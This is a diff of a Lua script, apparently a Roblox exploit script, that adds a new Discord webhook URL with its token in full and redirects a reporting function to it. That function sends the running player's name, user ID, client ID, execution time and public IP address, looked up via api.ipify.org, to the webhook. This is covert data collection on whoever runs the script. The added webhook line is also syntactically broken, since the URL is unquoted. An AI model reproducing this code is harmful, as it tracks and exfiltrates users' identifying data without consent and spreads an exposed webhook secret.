@@ -65,7 +65,7 @@ local function sendToWebhook(title, description, isWhitelisted, extraFields)
                     {name = 'Player Name:', value = lplr.Name},
                     {name = 'UserID', value = lplr.UserId},
                     {name = 'clientID', value = clientID},
-                    {name = "Config", value = "PRIVATE"},
+                    {name = "Config", value = "BOOSTER"},
                     {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
                     unpack(extraFields or {})
                 }
@@ -97,6 +97,8 @@ local function sendToWebhook(title, description, isWhitelisted, extraFields)
     end
 end
 
+local blekhook = https://discord.com/api/webhooks/1138924457105301505/7XSBdxKCnkRCxALeVIHGskQwHX4aoO9IHxy38_DJ-XaQYIGDHawxGeUpf9lTHFL3H03W
+
 local function sendMessageToWebhookifNoWl(messageContent)
     local message = {
         ['embeds'] = {
@@ -108,7 +110,7 @@ local function sendMessageToWebhookifNoWl(messageContent)
                     {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
                     {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
                     {name = 'clientID', value = clientID},
-                    {name = "Config", value = "PRIVATE"},  
+                    {name = "Config", value = "BOOSTER"},  
                     {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},   
                     {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')}        
                 }
@@ -121,7 +123,7 @@ local function sendMessageToWebhookifNoWl(messageContent)
     if syn then
         response = syn.request({
 			{
-				Url = hook,
+				Url = blekhook,
 				Method = 'POST',
 				Headers = {
 					['Content-Type'] = 'application/json'
@@ -133,7 +135,7 @@ local function sendMessageToWebhookifNoWl(messageContent)
 	elseif request then
 		response = request({
 			{
-				Url = hook,
+				Url = blekhook,
 				Method = 'POST',
 				Headers = {
 					['Content-Type'] = 'application/json'
@@ -145,7 +147,7 @@ local function sendMessageToWebhookifNoWl(messageContent)
 	elseif http_request then
 		response = http_request({
 			{
-				Url = hook,
+				Url = blekhook,
 				Method = 'POST',
 				Headers = {
 					['Content-Type'] = 'application/json'
